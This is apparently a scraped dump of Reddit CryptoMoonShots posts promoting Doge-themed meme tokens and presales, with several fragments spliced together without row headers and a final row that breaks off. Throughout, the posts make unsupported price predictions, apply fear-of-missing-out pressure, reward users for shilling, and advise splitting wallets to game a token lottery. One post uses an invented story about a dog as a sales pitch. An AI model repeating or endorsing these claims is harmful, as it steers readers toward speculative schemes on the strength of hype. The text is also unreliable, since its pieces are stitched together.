Conclusion: The (extremely) early nature of this project and being Doge's first DeFi project are reasons why I believe it makes a lot of sense for me, especially as it has not hit interest even in the meme coin space because listing on CoinGecko and Coinmarketcap is still incoming. Going in at on the first DeFi Doge with a $50k market cap, imo that's a huge potential just by the brand alone. As usual, DYOR.",21,2021-03-18 19:09:43,10

DOGE,CryptoMoonShots,📢The next Dogecoin according to experts - Bichamon Coin - Do not miss out on this lowmarketcap gem💎,"📢The next Dogecoin according to experts - Bichamon Coin - Do not miss out on this lowmarketcap gem

Bichamon has  often been referred to by experts as the next ""Safemoon"" or ""Dogecoin""

(BMC) Is the functioning native currency in the up and coming Play to earn Video Game named Bicha Monsters.

Which is short for: Binance Chain Monsters. And reflects back to the Binance Smart Chain which the coin has been launched through.

The Company and persons behind the cryptocurrency and Play to earn Video Game is mainly located in Norway / Switzerland / Amsterdam.

And their looking to combine the Blockchain Technology with Passive income, Gamification, NFT, DEFI and various other features all in one.

And they are planning on boarding on millions of players for their video game through their partners in Europe and Asia.

Experts have often refereed to them as the next ""Safemoon"" or ""Dogecoin"". Not because they are the same in terms of utilities.
But rather because of the similar interest levels at such early stages, that investors and exchanges have taken on the projects.

The native currency (BMC) and it's functioning Tokenomics:
8% Gets redistributed back proportionate to all wallet holders of (BMC) based on exchange volume and in game transactions in USD(c).
4% is redistributed to Marketing & Strategic buy back (BMC) bought back will be sent to a burn address to increase the scarcity of the native currency.
2% Is automatically re-added to liquidity pool to create a more stable price floor for (BMC).
There is also a built in anti whale feature in the contract to ensure that no higher amount than 0.125% of the total supply is being able to be sold at once.
The Tokenomics around (BMC) ensures that even if there would occur a ""Crypto downtrend"" that holders and players still get rewarded.
In the up and coming video game which is set to be released by end of January 2022 On Ios & Android for mobile. And Windows for PC.

Players are able to run freely in a Meta verse and tame various of creatures and sell/trade these to other players or put up for live auction.
There is also the option to mint these as non fungible tokens, and create your own unique set of Bicha Monsters through race evolving and combining.
Players themselves owns all the data and intellectual property associated with their user accounts in the video game.

This is without a doubt a company and cryptocurrency that should be watched.

DOGE,CryptoMoonShots,"New Method of Arbitrage Trading in the Cryptocurrency Space: Top Coins to Watch in 2024
","Arbitrage trading has long been a popular and effective way to profit in the world of cryptocurrencies. It involves exploiting the price differences of the same asset across different exchanges. As the crypto market continues to evolve with increasing complexity, **new arbitrage trading methods** are emerging, allowing traders to maximize profits more efficiently.

# What’s New in Arbitrage Trading?

In 2024, traders are shifting towards more **advanced strategies**, thanks to developments in automation, cross-chain technology, and decentralized finance (DeFi). These methods allow for quicker execution, better access to liquidity, and higher profitability. The new approaches also utilize smart contracts and automated bots, which help traders find and capitalize on opportunities faster than ever before.

Key innovations include:

1. **Cross-Chain Arbitrage**: With the rise of multi-chain ecosystems, traders can now perform arbitrage across different blockchains, using assets that are wrapped or tokenized on various platforms. This method allows for more opportunities as users trade between Layer-1 and Layer-2 solutions, like Ethereum and its Layer-2 networks (Arbitrum, Optimism).
2. **DeFi Arbitrage**: DeFi platforms such as decentralized exchanges (DEXs) provide unique arbitrage opportunities. Traders can capitalize on price differences between DEXs and centralized exchanges (CEXs) or between different DEXs. The liquidity pools on DEXs are often subject to slippage, and this volatility can create profitable arbitrage windows.
3. **Flash Loans**: A new and innovative DeFi tool, **flash loans** allow traders to borrow large sums without collateral, execute arbitrage trades, and repay the loan within the same transaction. This opens up the possibility of profiting from minimal price differences without upfront capital.

Our team and I also discuss these topics in our discord and telegram community, join us : [discord.gg/RSr7DfCJhp](http://discord.gg/RSr7DfCJhp) and t.me.wallstreetNEWSLLC

# Top Coins for Arbitrage in 2024

Several cryptocurrencies are particularly well-suited for these new methods of arbitrage due to their high liquidity, volatility, and presence across multiple exchanges. Here are some of the most promising coins for arbitrage trading in 2024:

1. **Ethereum (ETH)**
   * As the second-largest cryptocurrency by market cap, Ethereum is the backbone of the DeFi ecosystem and a top choice for arbitrage trading. Ethereum’s widespread use across both centralized and decentralized platforms makes it ideal for DeFi arbitrage, particularly with the rise of Layer-2 solutions like Arbitrum and Optimism.
2. **Polygon (MATIC)**
   * Polygon is a Layer-2 scaling solution for Ethereum and has become a favorite in the DeFi space. With its growing list of decentralized applications (dApps) and liquidity pools, MATIC frequently shows price discrepancies across DEXs and CEXs, providing ample arbitrage opportunities.
3. **Avalanche (AVAX)**
   * Known for its high throughput and low transaction costs, Avalanche is emerging as a key player in the DeFi space. With a growing number of DeFi protocols being built on its platform, AVAX offers profitable arbitrage opportunities, especially when comparing its price across different exchanges.
4. **Binance Coin (BNB)**
   * Binance Coin powers the Binance Smart Chain (BSC) and remains a top cryptocurrency for arbitrage due to its utility across the Binance ecosystem and multiple exchange listings. The high liquidity of BNB ensures that traders can take advantage of price discrepancies with minimal slippage.
5. **Toncoin (TON)**
   * Supported by the Telegram Open Network, Toncoin is becoming a significant player in the blockchain space. With its increasing adoption and trading volume across exchanges, Toncoin presents promising opportunities for arbitrage trading, particularly between new DEX listings and established CEXs.
6. **Solana (SOL)**
   * Solana’s blockchain is known for its speed and low transaction costs. As more projects are built on Solana, its trading volume continues to grow across DEXs and CEXs. This increased activity and cross-chain usage make SOL an ideal candidate for arbitrage, especially between DEXs on Solana and CEXs.

# How to Apply New Arbitrage Strategies in 2024

To successfully execute arbitrage using the new methods, traders must stay informed and utilize the right tools:

* **Automated Trading Bots**: With real-time execution being critical in arbitrage, automated bots can help identify and execute trades faster than manual methods. These bots monitor price movements across exchanges and trigger trades when favorable opportunities arise.
* **Cross-Chain Tools**: Using cross-chain bridges allows traders to transfer assets between blockchains seamlessly. Tools like **Anyswap** or **Thorchain** enable fast swaps between chains, making cross-chain arbitrage feasible.
* **Flash Loans**: By utilizing platforms like Aave or dYdX, traders can use flash loans to amplify their arbitrage trades without needing upfront capital. Flash loans enable traders to exploit even small price discrepancies for profit.
* **DeFi Aggregators**: DeFi aggregators such as **1inch** or **Matcha** help traders find the best rates across multiple DEXs. These tools simplify DeFi arbitrage by showing real-time price comparisons and liquidity availability across decentralized exchanges.

# Conclusion

As we enter 2024, **arbitrage trading** continues to be one of the most effective ways to profit from the cryptocurrency market. The rise of **cross-chain technology**, **DeFi**, and **flash loans** provides traders with new tools and methods to enhance their strategies. By focusing on promising coins like Ethereum, Polygon, and Solana, and using advanced trading tools, traders can seize the emerging opportunities in this dynamic and fast-growing space.",760,2024-10-05 20:25:31,8

Projects built on the foundation of markting and community involvement are the untamed wilderness of our future.

 As we move further away from rigid financial structures and traditional mindsets, we become free to discover new ways to solve problems and relate to one another.

⭐️USECASE:

Our Baby Doge Rocket (BDR) cross-chain multi swap enables trading tokens across different blockchains, but without using an intermediary party (e.g. an exchange service) in the process.

We all know the frustrating challenges when one wants to buy a token on ex. Pancakeswap, but you only have ERC-20 tokens in your wallet.

We at Baby Doge Rocket have started developing a true Cross Chain Muti-swap Dapp.

This will make it easy for all to swap tokens across all chains with a simple few mouse clicks.

&#x200B;

Woolly Doge is a type of Shiba Inu that is randomly born with a recessive trait that makes their hair very long, very fluffy and very cute! Woolly doges are born randomly and very rarely, and therefore cannot be created like regular Doges. It’s up to pure luck for a Momma and Daddy Doge to have a Woolly Doge in their litter. Celebrities spend 5x the price for these eccentric fur balls because of how rare and cute they are.

&#x200B;

Woolly Doge is the fluffiest doge of the Doge family. He was the only doge in the family born with extra long fur, which makes him very rare and extremely cute. The rest of the doge family makes fun of Woolly, but secretly they envy him. Maybe it’s just me, but I can’t help but to collapse on the floor and start crying when I look at Woolly Doge because he’s so darn cute!

&#x200B;

Woolly spent his first days getting bullied by his brothers and sisters, especially Mini doge. They would bite him, and drag him around by his long fur coat, but they couldn’t hurt him because his fur was so thick! This has made Woolly Doge by far the most resilient of all the doges. One day, when Woolly was playing in the front of the Doge family’s mansion home, his jealous sister Mini Doge pushed him into the street, right in front of a speeding car! Woolly rolled into the cars path… ‘Skreeeeeeetch’ went the car! What happened next, made the entire Doge family drop their jaws. To their shock and surprise, the speeding car bounced off of Woolly Doge, doing a front flip over itself and landed perfectly on it’s wheels and kept on driving. Fearing for Woolly’s life, all the Doges ran over to see if Woolly was alright. Woolly Doge was LAUGHING OUT LOUD. Woolly Doge’s extra fuzzy fur acted as a shock absorber and didn’t feel a thing!

The Crypto market has been underwhelming lately, and many projects have gone to the grave. Elon’s era is over… Let’s get our party and celebration started!

Doge Back is aptly named ! It’s a simple concept – it combines the two trending mechanisms : buy back and dividend

Doge Back is built for the holders to win. 10% paid in DOGE and 5% buy back fund & marketing. Dividend paid every 30 minutes. We have also implemented classic features in the token (Anti-dump & Anti-whale). This is made to reward long holders, to discourage people looking for a pump & dump.

&#x200B;

\--- What is it? ----

The Grouper Token is a perpetual lottery token hosted on the Binance Smart Chain. There are hourly, daily, and weekly Lottery draws. The amount of Grouper tokens needed to play will be determined by the cost of the coin and overall total holders.  All you must do is have at least the minimum amount to automatically be entered into all the lotteries. 176 Lotteries A Week

&#x200B;

\--- How do I make money? ---

1. Buy the minimums to play lottery and enjoy community

2. Buy more, become an owner, help steer the project and eventually sell back your tokens to those trying to join at a much higher price + play all the lotteries.

&#x200B;

\--- Why is it different? ---

The supply of Grouper is elastic. You have deflationary pressure when Grouper is traded as there is a 6% tax on every transaction. 5% that is burned, along with the 1% advertising fee (6% total). This helps to reduce supply while also discouraging high speed bots from buying and selling around the lottery times. The Grouper contract is fully published for everyone to read unlike many other lottery tokens on the Binance Smart Chain.

&#x200B;

\--- How can they guarantee winners? --- (THIS SOLVES PROBLEM 1)

Minting coins is not evil, as long as it is explained upfront. To ensure timely lotteries the coins are minted. Hence if transaction volume is low this might cause slight inflation. The max coins awarded per week is equal to 1.5% of the total available coins. The 5% transfer tax easily counteracts this over time.

Many other bsc lotteries die because their volume trails off and they cannot pay lotteries!

&#x200B;

\--- What the heck is GROUPER Swap? --- (SOLVES PROBLEM 2)

Grouper swap allows newer members to bsc to buy in directly with Bitcoin, Litecoin, and Doge coin. (More coins added soon). This allows them to skip pancake swap and all the headaches of converting to bnb and then to the GROUPER lottery token. Imagine when the Doge boys figure out they can join a lottery join FOR LIFE for 50 Doge.

&#x200B;

\--- Simplicity --- (SOLVES PROBLEM 3)

Buy, hold, and win. It is literally that simple. If your wallet holds the minimum amount you are eligible to play all 176 weekly GROUPER lotteries! The minimum amount needed will NEVER go up, only down as the market cap increases. The dev’s are aiming to peg it at a $25 entry per wallet. So, if you buy more coins make sure to split them into separate wallets so you get more chances to win. (Metamask works great for this). The devs are also working on the website so you will be notified by email, telegram, and TEXT MESSAGE if you win! The weekly lottery is obviously the largest draw, but it is super fun being able to watch all the hourly winners in the chat get excited!

&#x200B;

\--- Published Contract ---

Grouper contract is fully published and the devs answer any questions about it. Please support open source and only contribute to bsc projects that fully publish their contracts!

&#x200B;

\--- What are the tokenomics? ---

The supply of Grouper is elastic. You have deflationary pressure when Grouper is traded as there is a 6% tax on every transaction. 5% that is burned, along with the 1% advertising fee (6% total). This helps to reduce supply while also discouraging high speed bots from buying and selling around the lottery times. The Grouper contract is fully published for everyone to read unlike many other lottery tokens on the Binance Smart Chain. The overall 5% burn results in deflationary pressure. Fair rules, published contract, and fair randomization.

&#x200B;

\--- Can you increase your odds? ---

If I have more Grouper does it increase my chances? No, each wallet has the same chance to win. You can split your wallet into several smaller wallets for better chances as long as they hold the minimum.

&#x200B;

\--- Liquidity lock? Presale? ---

The Grouper presale was 5/30/21 and sold. Liquidity locked until 2022.

&#x200B;

\--- How do I trust GROUPER? ---

Functions allow you to interact directly with GROUPER on the blockchain!

Trust but verify, all GROUPER information can be verified directly on the black chain. Examples include last winner, when the next jackpot is, and how many current holders there are.

&#x200B;

\--- Is there a roadmap? ---

\- Upcoming Mobile App

\- Text Notifications If You Win

\- Expanded Website Integration

\- Influencer Affiliate Program

\- Ethereum 2 Upgrades

&#x200B;

\--- Are you still reading? ---

If you are still reading, I hope you enjoyed learning a little bit about the Grouper project. I got my bags and am waiting for takeoff. I believe the facts presented above clearly explain why Grouper will be here for the long run and outpace all the bsc and crypto lotteries.

Grouper is not trying to be the best bsc lottery… They are trying to be the best CRYPTO lottery!",2352,2021-06-10 09:03:37,204

MiniDoge - The next wave of tokenomics is here. For every sell, there is a buy. We took EverRise tokenomics and improved them to the next level. Presale goes live on Tuesday at 3:00pm PST. Here’s your chance to become a whale

The project is going to hire a group of influencers that will be promoting the project on the internet in order to bring in more focus to this project and provide the best returns for its holders. Its going to be a moonshot so get in before its too late. The community is very active and the admin team is doing a lot of hard work behind the scenes in order to make sure this wonderful project succeeds.

MiniDoge is combining the extreme viral potential of the Doge tokens with the amazingly high profit potential of buyback tokenomics (a very improved everrise). Every time a buy is placed, another buy is placed immediately after. Where the other buyback tokens failed is that they had a FIXED buyback amount. MiniDoge improves this by a variable buyback amount that accounts for daily volume. This ensures a smooth ride up to the moon and market stability! The best part? If you’re reading this right now, you’re early! The presale goes live on Tuesday at 3:00pm PST. The max presale buy in is 2bnb and it will likely sell out in under one minute.

Here’s a way you can become a SUPER WHALE as well. Mini Doge is currently holding a contest which will grant you access to the PRIVATE pre-sale. The contest works by announcing winners before the presale who have done a lot of promoting, shilling, and spreading the word for the token.

Dog token presales usually sell out in minutes and have made many people extremely rich. Because of the added tokenomics, I wouldn’t be surprised if this touches a $100M market cap in one day.

The prepaid card will allow users to top up their cards with coins such as BNB, BUSD, or Smart Doge (SDOG). This gives users more options when it comes to using their cards for payments and purchases.

In order to access the Visa virtual card, users will have to hold a minimum of 2 BNB worth of SDOG tokens. This clause makes sure that the tokens are not getting dumped and investors actually hold on to their coins.

Total of 3 winners will be chosen based on the quantity/quality proof they provide as screenshot(s).

🥇 First Place: 5 BNB

FAQ

Will the card work on Amazon, Binance?

Amazon - yes. Not sure about Binance as we don't know if Binance accepts prepaid Visa cards.

Prepaid Visa card issuing country?

United Kingdom

Who we are partnering with for the prepaid cards?

I cannot release any information yet. I can just tell you that it's not Visa directly as that would take us ages to get something signed. There are lots of prepaid plastic/virtual card companies around the world. So much that you can barely count them. There are a couple of companies in every continent that already have all contracts in place and they sign all these little companies under theirs and make the card issuing process super easy and accessible for projects like ours. I can give you a couple of examples if you have doubts - Prepaid FInancial Services Ireland, Contis Financial Services Ltd, and more.

Will the card work worldwide?

Yes, it will work in all online merchants that accepts Visa Prepaid cards.

For those asking how did we manage to sign with Visa -

They are Visa cards. What I'm saying is that we don't have to sign a contract with VISA directly but instead we use companies who've already partnered with them. I cannot announce yet which one we've partnered with but there are many, for example, one of the largest ones are Prepaid Financial Services Ireland ([https://prepaidfinancialservices.com/en/](https://prepaidfinancialservices.com/en/)) and Contis Financial Services Ltd ([https://contis.com/](https://contis.com/)) and many more. These two companies alone are issuing cards to hundreds of other prepaid card companies across Europe and not only. 

Signing with these companies is much easier.

You can customize your investment options and explore CyberDoge ecosystem where you can grow your wealth in different ways:

&#x200B;

🕹 CyberDoge themed game 🕹

👉 CyberDoge's first game is on memes and popularity. This game is a fun, continuous exploration of the world of a futuristic doge. Doge of the future is rather large and cool. The game will attract players who enjoy Mobile app games.

👉 App games are almost as popular as PC or Mac designed games. Their intention is to be the first popular game company that uses a native currency within the game. Cyberdoge, the first native in-app currency / crypto-currency. 

&#x200B;

🤖 CyberSwap 🤖

👉Cyberswap brings ease to a Cyberdoge investor because it is another tool of efficiency. Similar to PancakeSwap, CyberSwap may be used to swap various tokens for others. CyberSwap’s main grab on the market is their attention to details. CyberSwap will attend on each aspect, innovate them, and debug the system before release.

&#x200B;

💰 CyberStaking 💰

👉 CyberDoge will have a swap and a staking pool. When you place your tokens in the pool you’ll be entitled to a certain percentage to earn (yield) within a given time. For example, let’s say you enter 1 trillion CyberDoge in the pool and your APY is 30 percent.

👉 This means that you’ll earn 300 billion tokens (30 percent) if you leave it in the pool for that duration. Of course, each day you’ll earn tokens while in the pool, you do not need to wait the full year.

DOGE,CryptoMoonShots,WoollyDoge presale in 2 days 🚀 | Earn 8% DogeCoin just by holding! | Auto distribution and Dividend payouts 💰,"🗓 Presale begins on DxSale July 29th

🔗 https://dxsale.app/app/v2\_9/defipresale?saleID=1745&chain=BSC

I have incredibly sad story to tell you. Today, as I was walking my kids home from school, we saw two of our neighbors' adorable Shiba Inu puppies playing near our house in their front yard. One of them is really small, and the other was super fluffy and cute and really friendly! Honestly I had never seen a Shiba Inu so fluffy before! Anyways, after my kids had their fun, we were about to head inside, when out of nowhere some jerk driving a slime green Lamborghini with peanut butter seats came sliding around the corner in a cloud of smoke. The driver floored it and came barreling toward us, and yelled something like ""pop smoke b\*\*\*h!"" Sadly, the small Shiba pushed the fluffy one into the street right in front of the speeding jerk in the Lambo. The car hit the poor fluffy Shiba dead on, flipping him up into the air. 

Now, I normally wouldn't tell a sad story like this and post it on Crypto Moon Shots, but the end of the story is quite extraordinary.

Flipping through the air, the fluffy Shiba Inu fell back into the cloud of tire smoke. We rushed over, along with other doges from the neighborhood, to see if he was alright. When the smoke cleared, he was standing on his feet and wagging his tail! We couldn't believe it! He had a huge smile on his face as if he was laughing!

We started talking to the other doges and two of them were his parents. They explained to us that he has a recessive genetic trait that makes him have very long and fluffy hair that actually protects him from getting hurt. They told me the name is Woolly Shiba's. My kids starting pleading with, ""I want a Woolly Doge, I want a Woolly Doge!"" I looked up online how expensive they are, and told my kids maybe for Christmas. 

Next time I see that driver I'm going to really give him a piece of my mind….

MoonRise is an improved fork of the wildly-successful EverRise token,with a  suite of improved features and tokenomics. Community members will be  able to participate in""Moon Shots"" using the Whale Wallet's BNB. MoonShots will be activated at holder milestones during MoonRise's launch phase, but eventually will be controlled through a  community-consensus based dApp.

&#x200B;

You all already know the EverRise drill: For those wondering about the  contract. The whale is filled with $MOONRISE tokens through tax, the tax is payed for by the sellers/buyers. That tax is then sold by the whale  to be converted into BNB, essentially not effecting the price because the tax was paid for previously by sellers/buyers. The Whale is only  contracted to buy and burn and that is it, we cannot touch the BNB we  can only adjust how much the buyback is set to! (everrise)

&#x200B;

👉 But here's what makes 🌛 $MoonRise 🌛 special. The team has implemented a ""callMoonShot"" function into the contract, which basically spends a  voted-upon amount of BNB directly from the Whale address, to pump into  the market. You can view live countdowns to these pumps (currently based  off of wallet holder milestones) on the website: [https://MoonRiseCoin.com](https://moonrisecoin.com/)

DOGE,CryptoMoonShots,🌎 $ Doge Protocol | Quantum resistant proof-of-stake blockchain |Smart contracts support | High TPS| Low Txn fee| Market cap is 180K| Strong community | Fair launch,"# Get all the latest news in relation to the amazing 🌎 Doge Protocol. Join their community!

[https://t.me/dogeprotocolcommunity](https://t.me/dogeprotocolcommunity) 

**💲** **Doge Protocol** **💲**

Website: [https://DogeProtocol.org](https://dogeprotocol.org/)

Twitter: [https://twitter.com/DogeProtocol1](https://twitter.com/DogeProtocol1)

👉 **What is the** **$****Doge Protocol** **exactly?**

Doge Protocol will be a combination of decentralized networks, smart contracts and

decentralized apps (dapps), that form the backbone of this decentralization

initiative. The primary component of Doge Protocol will be a quantum-resistant

blockchain that supports smart contracts, side chains and is scalable in the number

of transactions. 

**👉 $Doge Protocol** **blockchain?**

A robust and scalable blockchain will be required to serve as the backbone for executing the vision of Doge Protocol, upon which other building blocks can be developed. **This blockchain will become the first one to be quantum resistant, proof of stake with smart contract support**

**👉 Quantum Resistance?**

Whitepaper: [https://github.com/DogeProtocol/Doge-Protocol-Whitepapers/blob/main/Doge-Protocol-Blockchain-Quantum-Resistance-Whitepaper.pdf](https://github.com/DogeProtocol/Doge-Protocol-Whitepapers/blob/main/Doge-Protocol-Blockchain-Quantum-Resistance-Whitepaper.pdf) 

There is also a specific reason why this blockchain must be quantum-resistant. Due to the advent of quantum computers, there is an imminent threat to existing asymmetric encryption systems like RSA, ECDSA that are used to secure almost all the current blockchains. Using algorithms like Shor’s (rapid integer factorization) and Grover’s (quadratic mining speedup on Proof of Work systems), Quantum Computers can break current blockchains in different ways. One of the visions of the Doge Protocol is that it should be secure in the future as well.

Security itself evolves over time, hence no algorithm should be deemed future proof, including current quantum-resistant algorithms. However, but from the current landscape, quantum computers are a viable threat to blockchains. Hence the vision is to build a blockchain that is resistant to currently known quantum computer threats and keep it evolving based on the changing security landscape. 

**💎Tokenomics:**

📌 Symbol: DogeP

Doge Protocol was launched in a fair manner on the Ethereum Blockchain on September 1, 2021. There is no BSC token. 100% of the total supply was added to UniSwap and SushiSwap. The liquidty was locked in UniCrypt for 29 years. 

The quantum resistant blockchain is under active development. 15% of the total supply of this blockchain will be allocated to DogeP token holders as part of mainnet launch. The process to get DogeP coins for token holders will be given before mainnet launch.

📌 Total supply: 100 trillion.

📌There was no presale or ICO.

📌There was no dev team or founder allocation.

💲 Deflationary: 0.1% burn on each transaction.

💲 Maximum allowed tokens per account at launch: 0.99%

DOGE,CryptoMoonShots,"Doge, Neiro And Neirei","While Dogecoin and Neiro are warming up, what about NeiRei?

Dogecoin is rising again with the rise of BTC.

After Kabosu died, the same family adopted a dog for the second time. This dog is Neiro. The dog that the Binance co-founder wrote an article about and referred to as the next Doge. The reason he referred to it as the next Doge is because it is the second dog that the Kabosu family adopted. Right now, everyone in crypto is referring to Neiro as the next doge and they even think that it will surpass Shiba in terms of market cap.

Dogecoin's ATH is 106B market cap. Neiro's ATH is 970m market cap. Now let's come to the headliner, headliners always go on stage last and NeiRei is quietly preparing to take the stage. It is still in the 3-4m market cap range. Its still very early.

With the bull run ahead of us, it wouldn't be surprising if Dogecoin reaches ATH again, and Neiro reaches the 10-20B market cap range. That's what I believe.

What about NeiRei?

I am a Neiro holder. I invested in Neiro early on and now I have a big bag. An untouched bag.

While constantly chasing early opportunities on the road to freedom, sometimes some come to you by chance, sometimes you have to find them yourself, if you are reading this post, I guess you are in luck.

After Neiro took action, I immediately started looking for alternatives, Neiro was good but I needed to reach cumulative growth.. I had to take advantage of this hype.

And yes. I came across NeiRei. The developer had left the coin. And I saw that it was CTOed. The first thing that caught my attention was that it was CTOed. Because Neiro was CTOed and its alternatives should be CTOs too.

I started researching what alternative Chinese coins were doing. Pepe is not being talked about anywhere, I saw PeiPei, the Chinese version of Pepe, reach 180m ATH. I guess I was in the right place. Neiro will be talked about everywhere during the bull run and it is silently standing there: NeiRei. The Chinese Neiro.

NeiRei was CTOed by a few people who believed in it. Neiro is following its hype. Neiro is being talked about everywhere and all eyes should be on NeiRei.

Floor formed strongly in the 3-4m market cap range. The accumulation period continues. As the Neiro hype gets crazier, NeiRei will be next.

Considering that Neiro will reach 5-10b market cap, I see a very high probability of NeiRei reaching the 100-500m market cap range with the crazy bull run.

I focus on the things that have the potential to lead me to financial freedom and I have to tell you clearly that the 2 things that have the highest probability of doing so during this bull run are Neiro and NeiRei.

We may have missed Pepe and PeiPei, but Neiro and NeiRei were sent to us as a second chance. With even greater potential than Pepe and PeiPei.

Now I'm just telling you this and signing it:

Neiro and NeiRei will surpass all the coins before them and head straight to the top.

While you still have time. While you're still early. Don't miss out on the greatest potential.

💻 Introduction

DogeWarior is a card-based fighting game using both meme characters and actual real life (cartoonized)
fighters. By collecting, training, and leveling up your fighter your squad grows stronger, unlocks new skills,
and can enter new competitions and tournaments. Each tournament unlocks new collectibles which you
can trade, collect, or utilize in battles.
Players will collect cards through playing and progressing through a tier-based system. Unlocking new
tiers will reward players with new packs, card designs and bonus cards which they can use in battle or to
upgrade their fighters.

💻 Mechanics

How does the game work?
DogeWarrior is a turn-based fighting game where the objective is to eliminate the other player’s squad
before the opponent can.
❖ Each player starts the game with 3 cards in their hand that they choose before matchmaking.

❖ Players will pick a card from their hand and choose a stat to battle with and which of the
opponent’s cards to attack.

❖ Each card has a set number of hearts or “Lifepoints(LP)”, when they run out the card is
discarded and you are left with 2 cards;

❖ The chosen stat is then compared to that of the opponent, higher number wins the round (loser
loses 1 LP)

❖ The game is over when one of the players runs out of cards.

❖ Some cards will have special ‘passive’ abilities which can impact overall gameplay. Players are also
free to use 3 bonus cards per match which can either increase their fighter’s abilities or diminish
his opponent’s deck. Beware, these cards are rare to come by!",1434,2021-09-07 15:03:46,145

DOGE,CryptoMoonShots,AIBO INU a new breed of DOGE token is here presale on Unicrypt July 7th at 12pm UTC,"🐶 A new breed of doge token is here 💎 AIBO INU The Next Generation #doge token 💠 Presale on Unicrypt 7 July, 12PM UTC 🏁

Ever wonder if the next generation of Crypto Space is already here? I found out about this token just recently, everything look well prepared and the hype is just getting stronger.

Check them out on their website at www.aiboinu.io

They already burned 50% of total supply from 1 quadriliion $AIBO tokens, implement 10% tax on which 5% goes to liquidity pool automatically and 5% auto farming (your tokens increase just by holding them in your wallet).

Contract has been audited by dessert finance and team is also KYC’ed. Their plan to take AIBO INU to the next level is by making 3 distinguish type of NFT (they call it AIBOT), on which you can combine those NFT to create a rarer type of NFT that you can stake to earn more $AIBO and even BNB for Epic AIBOT type NFT thus increasing holders from time to time.

I’m also told that they have an ANTI WHALE system coded in their contract to prevent BIG DUMP on early stage.

Telegram members increasing everyday and has 8,5K members at the moment, this project is preparing to go beyond the moon.

I will definitely buy in their presales which are whitelisted, it’s easy to fill in their whitelist form and hopefully I’ll get the spot because it’s cheaper 10% and you are guaranteed to be among the early holders.",411,2021-07-05 04:59:25,849

DOGE,CryptoMoonShots,🐶 Doge Bandit ($DOGEITO) 🔫 | The first buyback Clifford-fork on BSC | Rallying for all new ATH | Based team | 5k mcap,"🐶 DOGE BANDIT ($DOGEITO) 🔫

DOGEITO went 100x from launch price of $1,200 to $120,000. Unfortunately people ended up robbing DOGEITO himself for christmas and pulled their money for presents, gift cards, toys, and delicious food for christmas eve and christmas day. The team has gotten top 5 on coinsniper, previous CMS #1, and huge TG influencers onboard. They have a great name, transparent team and no reason they can't do it again! Today is their push, will be using the buyback and marketing wallet and bring it back to new ATH! 

Doge Bandit is a clifford-fork. Clifford is a new project, does manual and auto LP-burns and reached 100m. We're the first buyback Clifford-fork on BSC, we have a revolutionary tax system that rewards buyers and cruelly punishes sellers👳🏽‍♂️.

DOGE Bandit has market cap milestone based roadmap. Where soon you and only you can help them unlock their full potential of Lil Banditos! NFT series, (cute doge cowboy NFTs), and developing a P2E game on their website. Larger scope roadmap features include merchandising the DOGEITO himself.

Market cap is currently 27k:

Tokenomics: Supply 1,000,000,000 Max Wallet 2% ❌🐳 Max Transaction 2%

On purchases:

3% Marketing 1% Liquidity 1% Buyback

On sells only:

10% marketing 6% Liquidity 2% buyback

**What is it?**

Daddy Doge is the head of the Doge family and the next 1000x BSC gem. The plans for the token are next level with a substantial marketing budget to match the ambitions. Adverts are being planned for Times square, Piccadilly circus and Tokyo to let the world know who the Daddy is.

“Some people don't believe in heroes but they haven't met my dad.” DOGE 2019.

Twitter - [https://twitter.com/DaddyDogeToken](https://twitter.com/DaddyDogeToken)

Website - [https://daddydoge.finance](https://daddydoge.finance/)

**What are the tokenomics?**

Simple as you like, there is a **9%** total transaction fee compromising of:

💰 **3% distributed to all holders**

Not only do you get to be part of the newest movement, you get rewarded by just holding. Every buy and sell gets paid amongst Daddy Doge holders in reflections. In short, the longer you hold the more tokens you earn.

💰 **3% added to the liquidity pool**

The contract accumulates tokens on buy/sells and then adds them to the liquidity pool to create a solid price floor and increases the stability of the token for everyone's benefit!

💰 **3% sent to a marketing wallet**

A token is nothing without it’s marketing power. Not only do we have a substantial budget to start, we want the snowball to keep the momentum. Following advertisements on time square, we want multiple exchange listings that send Daddy Doge to the moon alongside his son.

**What else?**

Daddy Doge is fed up of seeing rug pulls and honey pots, so he’s decided to give the community as much confidence as possible by:

* Locking liquidity for 5 years
* Renouncing ownership on launch
* No separate dev wallets that could crash the price
* Getting a smart contract audit as soon as is feasible

As soon as the world starts to know who the Daddy is, nothing can stop us. Join us, spread the word and enjoy your the ride 🚀🚀🚀",1924,2021-07-06 05:47:51,104

DOGE,CryptoMoonShots,DogeBonk ($DOBO) 🏏 - Meme token with a strong chance of going VIRAL. Contract Renounced / LP Burned / No Whales >2%,"DogeBonk is a completely unruggable, spontaneously formed community token with the most potential to go viral of any meme coin since Shiba.

Since DogeCoin exploded earlier this year there have been thousands of dog coins most of them scams, false promises and poor ripoffs with devs sole purpose being to make as much money from their holders as possible. Every day another team launches their coin trying to piggyback off the success of others, offering false promises of NFT marketplaces, metaverse worlds and whatever else is the newest trending hashtag on Twitter. These coins have forgotten that what makes you a meme coin is how good your memes are.

​

DogeBonk is different. The DogeBonk community spontaneously formed just two weeks ago on a dead dog token someone found with locked liquidity, renounced contract and SafeMoon tokenomics. We have grown from <300 holders two weeks ago to over 4000 today. We have no false road maps promising the world, we just spread our hilarious meme and convince others to join us as we bonk everything.

The memes and energy coming from this community is crazy. Just search DogeBonk on the search bar on Twitter and you’ll see what I mean. Once you see the quality of these memes you will see how DogeBonk has huge potential to go viral. DogeBonk is the most memeable project in the crypto space since Doge.

Despite our lack of false promises, the team and community is still delivering:

bonkSWAP launched, making it super easy for even non-crypto natives to purchase $dobo from fiat - [www.bonkswap.com](https://www.bonkswap.com/)

​

# Is DogeBonk safe?

* Liquidity was locked forever by burning all LP tokens 🔥
* Ownership of the contract was renounced.
* See proof on our website.
* Contract is a 1:1 copy of SafeMoon which was audited by Certik.
* Top holder owns only 1.9% of the supply.
* As microcap gems go, it’s an unruggable beauty.

# Tokenomics

* 10% tax on all transactions:
* 5% are distributed to fellow DOBO holders,
* 5% are added to liquidity to create an ever rising price floor.
* \-> token with deflationary properties and automatic yield generation. (Burn wallet is receiving \~1% of all transactions FORTY% burned so far)
* There was no presale and to prevent bots from sniping the token, you can only buy/sell 0.5% of the total supply at the time 🎯

DOGE,CryptoMoonShots,"🐶 Robin Doge 🏹 | The RobinHood of Crypto | Anti-Movement Token, Symbol of Crypto vs. Stocks | Launching soon!","Launching on Thursday, after hosting a pre-sale on DxSale at 5pm UTC, Robin Doge is set to become the new Anti-Movement token. 

**Who we are:** 

